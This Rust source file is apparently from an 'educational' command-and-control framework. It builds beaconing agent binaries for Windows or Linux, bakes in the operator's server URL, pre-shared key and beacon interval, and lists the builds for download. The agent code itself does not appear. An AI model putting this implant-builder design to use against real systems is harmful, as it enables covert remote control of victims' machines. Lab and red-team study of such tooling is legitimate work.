//! Educational agent build service — cross-compiles the agent crate with embedded config.

use chrono::Utc;
use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};
use std::process::Stdio;
use tokio::process::Command;

use crate::db::{AgentBuild, Database};
use crate::logger::{log_info, log_warn};
use crate::websocket::ServerState;
use serde_json::Value;

const BUILDS_DIR: &str = "./builds";

#[derive(Deserialize)]
pub struct BuildRequest {
    pub target_os: String,
    pub server_url: String,
    pub psk: String,
    pub beacon_interval: u64,
}

#[derive(Serialize)]
pub struct BuildResponse {
    pub success: bool,
    pub build_id: String,
    pub status: String,
    pub message: String,
}

#[derive(Serialize)]
pub struct TargetInfo {
    pub target: &'static str,
    pub extension: &'static str,
}

/// Map dashboard OS selection to Rust cross-compilation target.
pub fn resolve_target(target_os: &str) -> Result<TargetInfo, String> {
    match target_os.to_lowercase().as_str() {
        "windows" => Ok(TargetInfo {
            target: "x86_64-pc-windows-gnu",
            extension: ".exe",
        }),
        "linux" => Ok(TargetInfo {
            target: "x86_64-unknown-linux-gnu",
            extension: "",
        }),
        // Bare-metal (unknown-none) requires no_std; use native host target for educational labs.
        "binary" => Ok(TargetInfo {
            target: "native",
            extension: ".bin",
        }),
        other => Err(format!("Unsupported target_os: {}", other)),
    }
}

fn workspace_root() -> PathBuf {
    PathBuf::from("..")
}

/// Start an async agent build and return immediately with build_id.
pub async fn start_build(
    state: &ServerState,
    req: BuildRequest,
) -> Result<BuildResponse, String> {
println!("========== start_build CALLED ==========");
println!("Target OS: {}", req.target_os);

    if req.server_url.trim().is_empty() {
        return Err("server_url is required".to_string());
    }
    if req.psk.trim().is_empty() {
        return Err("psk is required".to_string());
    }
    if req.beacon_interval < 5 || req.beacon_interval > 3600 {
        return Err("beacon_interval must be between 5 and 3600".to_string());
    }

    let target_info = resolve_target(&req.target_os)?;
    let build_id = uuid::Uuid::new_v4().to_string();
    let now = Utc::now().to_rfc3339();

    tokio::fs::create_dir_all(BUILDS_DIR)
        .await
        .map_err(|e| format!("Failed to create builds dir: {}", e))?;

    let output_name = format!("agent_{}{}", build_id, target_info.extension);
    let output_path = format!("{}/{}", BUILDS_DIR, output_name);

    let build_record = AgentBuild {
        id: build_id.clone(),
        target_os: req.target_os.clone(),
        server_url: req.server_url.clone(),
        psk: req.psk.clone(),
        beacon_interval: req.beacon_interval as i64,
        file_path: output_path.clone(),
        status: "building".to_string(),
        created_at: now,
    };

    state
        .db
        .insert_agent_build(&build_record)
        .map_err(|e| format!("DB error: {}", e))?;

    log_info(
        &state.db,
        &state.tx,
        "Build",
        None,
        &format!(
            "Started agent build {} for target {}",
            build_id, req.target_os
        ),
    );

    let _ = state.tx.send(serde_json::json!({
        "type": "BuildStatus",
        "payload": {
            "id": build_id,
            "status": "building",
            "target_os": req.target_os,
        }
    }));

    let state_clone = state.clone();
    let build_id_clone = build_id.clone();
    let target_os = req.target_os.clone();
    let server_url = req.server_url.clone();
    let psk = req.psk.clone();
    let beacon_interval = req.beacon_interval;
    let target = target_info.target.to_string();
    let extension = target_info.extension.to_string();

    tokio::spawn(async move {
        run_build(
            state_clone,
            build_id_clone,
            target_os,
            server_url,
            psk,
            beacon_interval,
            target,
            extension,
        )
        .await;
    });

    Ok(BuildResponse {
        success: true,
        build_id,
        status: "building".to_string(),
        message: "Build started".to_string(),
    })
}

async fn run_build(
    state: ServerState,
    build_id: String,
    target_os: String,
    server_url: String,
    psk: String,
    beacon_interval: u64,
    target: String,
    extension: String,
) {
println!("========== run_build CALLED ==========");
    let root = workspace_root();
     println!("workspace root = {:?}", root);
     println!("current dir = {:?}", std::env::current_dir().unwrap());
    let output_name = format!("agent_{}{}", build_id, extension);
    let output_path = format!("{}/{}", BUILDS_DIR, output_name);

    let mut cmd = if target == "native" {
        let mut c = Command::new("cargo");
        c.current_dir(&root)
            .args(["build", "-p", "agent", "--release"])
            .env("C2_BUILD_SERVER_URL", &server_url)
            .env("C2_BUILD_PSK", &psk)
            .env("C2_BUILD_BEACON_INTERVAL", beacon_interval.to_string())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped());
        c
    } else {
        let mut c = Command::new("cargo");
        c.current_dir(&root)
            .args([
                "build",
                "-p",
                "agent",
                "--release",
                "--target",
                &target,
            ])
            .env("C2_BUILD_SERVER_URL", &server_url)
            .env("C2_BUILD_PSK", &psk)
            .env("C2_BUILD_BEACON_INTERVAL", beacon_interval.to_string())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped());
        c
    };

    let result = cmd.output().await;
match &result {
    Ok(output) => {
        println!("==================================");
        println!("Cargo exit status: {:?}", output.status);
        println!("STDOUT:");
        println!("{}", String::from_utf8_lossy(&output.stdout));
        println!("STDERR:");
        println!("{}", String::from_utf8_lossy(&output.stderr));
        println!("==================================");
    }
    Err(e) => {
        println!("Failed to execute cargo: {}", e);
    }
}

    match result {
        Ok(output) if output.status.success() => {
            let src = if target == "native" {
                root.join("target/release/agent.exe")
                    .exists()
                    .then(|| root.join("target/release/agent.exe"))
                    .or_else(|| {
                        if root.join("target/release/agent").exists() {
                            Some(root.join("target/release/agent"))
                        } else {
                            None
                        }
                    })
            } else {
                let base = root.join(format!("target/{}/release/agent", target));
let with_exe = base.with_extension("exe");

println!("==============================");
println!("Workspace root : {:?}", root);
println!("Base path      : {:?}", base);
println!("EXE path       : {:?}", with_exe);
println!("Base exists    : {}", base.exists());
println!("EXE exists     : {}", with_exe.exists());

let release_dir = root.join(format!("target/{}/release", target));
println!("Release dir    : {:?}", release_dir);

match std::fs::read_dir(&release_dir) {
    Ok(entries) => {
        println!("Files in release directory:");
        for entry in entries {
            println!("  {:?}", entry.unwrap().path());
        }
    }
    Err(e) => {
        println!("Could not open release directory: {}", e);
    }
}

println!("==============================");

if with_exe.exists() {
    Some(with_exe)
} else if base.exists() {
    Some(base)
} else {
    None
}
 };

            match src {
                Some(src_path) => {
println!("Source binary = {:?}", src_path);
println!("Binary exists = {}", src_path.exists());
println!("Destination = {}", output_path);
                    if let Err(e) = tokio::fs::copy(&src_path, &output_path).await {
                        fail_build(&state, &build_id, &format!("Copy failed: {}", e)).await;
                        return;
                    }
                    let _ = state.db.update_agent_build_status(
                        &build_id,
                        "completed",
                        Some(&output_path),
                    );
                    log_info(
                        &state.db,
                        &state.tx,
                        "Build",
                        None,
                        &format!("Build {} completed: {}", build_id, output_path),
                    );
                    let _ = state.tx.send(serde_json::json!({
                        "type": "BuildStatus",
                        "payload": {
                            "id": build_id,
                            "status": "completed",
                            "target_os": target_os,
                            "file_path": output_path,
                        }
                    }));
                }
                None => {
                    fail_build(&state, &build_id, "Compiled binary not found").await;
                }
            }
        }
        Ok(output) => {
            let stderr = String::from_utf8_lossy(&output.stderr);
            let msg = if stderr.len() > 500 {
                format!("{}...", &stderr[..500])
            } else {
                stderr.to_string()
            };
            fail_build(&state, &build_id, &msg).await;
        }
        Err(e) => {
            fail_build(&state, &build_id, &format!("Build process error: {}", e)).await;
        }
    }
}

async fn fail_build(state: &ServerState, build_id: &str, reason: &str) {
    let _ = state
        .db
        .update_agent_build_status(build_id, "failed", None);
    log_warn(
        &state.db,
        &state.tx,
        "Build",
        None,
        &format!("Build {} failed: {}", build_id, reason),
    );
    let _ = state.tx.send(serde_json::json!({
        "type": "BuildStatus",
        "payload": {
            "id": build_id,
            "status": "failed",
            "error": reason,
        }
    }));
}

pub fn list_builds(db: &Database) -> Result<Vec<Value>, String> {
    let builds = db.get_agent_builds(50).map_err(|e| e.to_string())?;
    Ok(builds
        .into_iter()
        .map(|b| {
            serde_json::json!({
                "id": b.id,
                "target_os": b.target_os,
                "server_url": b.server_url,
                "beacon_interval": b.beacon_interval,
                "status": b.status,
                "created_at": b.created_at,
                "download_url": format!("/api/agents/download/{}", b.id),
            })
        })
        .collect())
}
